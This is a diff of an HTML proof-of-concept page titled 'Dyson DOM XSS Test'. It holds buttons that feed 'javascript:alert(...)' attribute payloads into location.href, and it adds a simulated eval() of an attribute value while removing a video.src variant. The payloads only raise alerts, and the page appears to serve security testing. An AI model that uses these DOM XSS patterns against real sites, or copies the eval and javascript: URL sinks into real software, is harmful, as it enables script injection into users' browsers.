@@ -9,28 +9,33 @@
   </head>
   <body>
     <h2>Dyson DOM XSS Test</h2>
-    <button onclick="exploitVideoURL()">Exploit videourl + video.src</button>
-    <button onclick="exploitVideoImg()">Exploit videoimg + location.href</button>
-    <button onclick="exploitDataLogo()">Exploit data-logo + location.href</button>
-    <button onclick="exploitDataURL()">Exploit data-url + location.href</button>
 
+    <button onclick="exploitVideoImg()">Exploit 🔥 videoimg + location.href</button>
+    <button onclick="exploitDataLogo()">Exploit 🔥 data-logo + location.href</button>
+    <button onclick="exploitDataURL()">Exploit 🔥 data-url + location.href</button>
+    <button onclick="exploitFakeVideoURL()">Exploit (Simulated) 🔥 videourl + eval</button>
+
+    <!-- Simulated vulnerable DOM elements -->
     <div class="video_boxs pdp" videoimg="javascript:alert('videoimg XSS')"></div>
     <div class="video_section" data-logo="javascript:alert('data-logo XSS')"></div>
     <div class="video_section" data-url="javascript:alert('data-url XSS')"></div>
-    <video id="dyson-video" width="320" height="240" controls></video>
+    <div id="fake-video" videourl="alert('videourl eval XSS')"></div>
 
     <script>
-      function exploitVideoURL() {
-        document.getElementById("dyson-video").src = "javascript:alert('video.src XSS')";
-      }
       function exploitVideoImg() {
         location.href = document.querySelector(".video_boxs.pdp").getAttribute("videoimg");
       }
+
       function exploitDataLogo() {
         location.href = document.querySelector("[data-logo]").getAttribute("data-logo");
       }
+
       function exploitDataURL() {
         location.href = document.querySelector("[data-url]").getAttribute("data-url");
+      }
+
+      function exploitFakeVideoURL() {
+        eval(document.getElementById("fake-video").getAttribute("videourl"));
       }
     </script>
   </body>
